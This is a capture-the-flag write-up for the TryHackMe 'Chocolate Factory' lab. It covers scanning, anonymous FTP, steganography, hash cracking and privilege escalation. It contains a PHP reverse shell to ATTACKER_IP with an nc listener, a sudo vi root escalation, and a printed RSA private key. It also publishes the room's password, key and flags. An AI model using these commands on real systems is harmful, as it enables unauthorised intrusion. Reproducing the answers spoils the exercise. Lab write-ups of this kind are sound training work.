
---
# Chocolate Factory – TryHackMe Writeup
![banner](attachments/banner.png)
## Room: [Chocolate Factory](https://tryhackme.com/room/chocolatefactory)

Platform: TryHackMe  
Difficulty: Easy 
Category: Web, Steganography, Password Cracking, Privilege Escalation

---

# Step 1 – Initial Enumeration

We begin with a full port scan.
```bash
nmap -sC -sV -A <target-ip>
```
### Open Ports Discovered
```
21/tcp   ftp      vsftpd 3.0.5
22/tcp   ssh      OpenSSH 8.2p1
80/tcp   http     Apache 2.4.41
100/tcp  unknown
106/tcp  unknown
109/tcp  pop2
110/tcp  pop3
111/tcp  rpcbind
113/tcp  ident
119/tcp  nntp
125/tcp  unknown
```
![scan](attachments/scan.png)

---

# Step 2 – Web Enumeration

Visiting the web server reveals a hint pointing to:

```
http://<target-ip>/key_rev_key
```

Downloading the file and running `strings` on it:

```bash
strings key_rev_key
```

Reveals:

```
congratulations you have found the key:
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```

Extracted Key:

```
-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
```

This is a URL-safe Base64 Fernet key.

---

# Step 3 – FTP Anonymous Access

Anonymous FTP login is enabled.

```bash
ftp <target-ip>
```

After logging in anonymously, a PNG image is discovered:

```
gum_room.jpg
```

![](attachments/ftp.png)

---

# Step 4 – Steganography

Using `steghide`:

```bash
steghide extract -sf gum_room.jpg
```

No password was required.

This produces a Base64-encoded text file.

Decoding it:

```bash
cat b64.txt | base64 -d
```

The decoded output contains `/etc/shadow` entries including:

```
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

---

# Step 5 – Cracking Charlie's Password

Save the hash to a file:
```bash
nano hash.txt
```

Then use John the Ripper:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Password recovered:
```
cn7824
```

![passwd](attachments/passwd.png)

---

# Step 6 – Web Login and Command Execution

Using the credentials:

```
Username: charlie
Password: cn7824
```

After logging into the web interface, there is functionality to execute commands.
![web](attachments/command.png)
We use this to spawn a reverse shell:

```php
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/bash <&3 >&3 2>&3");'
```

On attacker machine:

```bash
nc -lvnp PORT
```

---

# Step 7 – Stabilizing the Shell

Once connected:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=/bin/bash
```

Now we have a stable interactive shell.

---

# Step 8 – Privilege Enumeration (Charlie)

Inside `/home/charlie`:

```
teleport
teleport.pub
user.txt
```

The `teleport` file contains an RSA private key.

```
www-data@ip-10-48-163-179:/home/charlie$ cat teleport
cat teleport
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----
```
---
# Step 9 – SSH Access as Charlie

Copy the private key to attacker machine:
```bash
nano id_rsa
chmod 600 id_rsa
```

Login via SSH:
```bash
ssh -i id_rsa charlie@<target-ip>
```

Retrieve user flag:
```
flag{cd5509042371b34e4826e4838b522d2e}
```

---

# Step 10 – Privilege Escalation via sudo

Check sudo privileges:
```bash
sudo -l
```

![sudo](attachments/sudo.png)
Output shows:
```
User charlie may run /usr/bin/vi as root
```

Exploit:
```bash
sudo /usr/bin/vi -c ':!/bin/sh' /dev/null
```

This spawns a root shell.

---

# Step 11 – Root Flag

Inside root's directory, there is a script `root.py`.

It decrypts a Fernet token using the previously discovered key.

Since the original script has minor formatting issues, we replicate the logic locally:

```python
from cryptography.fernet import Fernet

key = b"-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY="
f = Fernet(key)

token = b"gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ"

print(f.decrypt(token).decode())
```

Output:

```
flag{cec59161d338fef787fcb4e296b42124}
```

Root flag obtained.

---

# Final Answers

**Key Found:**

```
-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
```

**Charlie's Password:**

```
cn7824
```

**User Flag:**

```
flag{cd5509042371b34e4826e4838b522d2e}
```

**Root Flag:**

```
flag{cec59161d338fef787fcb4e296b42124}
```

---
## 🧑‍💻 Author

Ghost- Cybersecurity Learner & CTF Player